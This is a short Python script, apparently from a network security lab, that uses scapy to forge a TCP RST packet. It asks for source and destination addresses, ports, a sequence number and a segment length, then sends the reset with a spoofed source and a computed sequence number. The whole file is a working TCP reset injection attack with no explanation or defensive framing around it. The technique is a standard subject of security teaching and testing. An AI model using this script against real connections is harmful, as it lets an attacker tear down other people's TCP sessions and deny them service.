from scapy.all import *

src_ip = input('Source IP: ')
dst_ip = input('Destination IP: ')
src_port = int(input('Source Port: '))
dst_port = int(input('Destination Port: '))
seq_number = int(input('Sequence Number (raw): '))
tcp_seg = int(input('TCP Segment Len: '))

print('Send..')
IPLayer  = IP(src=src_ip,dst=dst_ip)
TCPLayer = TCP(sport=src_port,dport=dst_port,flags="R",seq=seq_number+tcp_seg)
pkt = IPLayer/TCPLayer
send(pkt, verbose=0)
print('Success')